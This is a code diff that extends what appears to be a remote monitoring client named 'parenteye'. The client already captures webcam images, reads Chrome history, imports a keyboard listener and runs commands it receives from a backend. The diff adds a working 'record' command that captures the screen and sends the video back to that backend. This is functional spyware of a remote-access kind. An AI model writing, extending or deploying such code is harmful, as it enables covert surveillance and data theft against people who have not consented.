@@ -16,6 +16,10 @@ from io import BytesIO
 from datetime import datetime, timedelta
 import glob
 import shutil
+import tempfile
+import imageio
+import mss
+import numpy as np
 from pymongo import MongoClient
 from pynput import keyboard
 from dotenv import load_dotenv
@@ -683,6 +687,34 @@ def check_pending_commands():
     except Exception as e:
         print(f"Error checking commands: {e}")
 
+def _record_screen(duration, fps=10):
+    """Capture a short screen recording and return base64 video data."""
+    frames = []
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        start_time = time.time()
+        frame_delay = 1 / fps
+        while time.time() - start_time < duration:
+            frame = np.array(sct.grab(monitor))
+            frames.append(frame)
+            time.sleep(frame_delay)
+
+    if not frames:
+        raise RuntimeError("No frames captured")
+
+    temp_path = os.path.join(tempfile.gettempdir(), f"parenteye_record_{int(time.time())}.mp4")
+    imageio.mimsave(temp_path, frames, fps=fps)
+
+    with open(temp_path, "rb") as f:
+        video_b64 = base64.b64encode(f.read()).decode("utf-8")
+
+    try:
+        os.remove(temp_path)
+    except Exception:
+        pass
+
+    return video_b64
+
 def execute_command(cmd):
     """Execute command received from backend"""
     command_type = cmd.get('command')
@@ -813,6 +845,20 @@ def execute_command(cmd):
                     send_result(command_id, {"type": "webcam", "success": False, "message": "Unable to capture webcam"})
             except Exception as e:
                 send_result(command_id, {"type": "webcam", "success": False, "message": str(e)})
+
+        elif command_type == "record":
+            duration = int(params.get("duration", 10))
+            print(f"🎬 Recording screen for {duration}s...")
+            try:
+                video_b64 = _record_screen(duration)
+                send_result(command_id, {
+                    "type": "record",
+                    "video_base64": video_b64,
+                    "mime_type": "video/mp4",
+                    "duration": duration
+                })
+            except Exception as e:
+                send_result(command_id, {"type": "record", "success": False, "message": str(e)})
         
         elif command_type == "chromehistory":
             try:
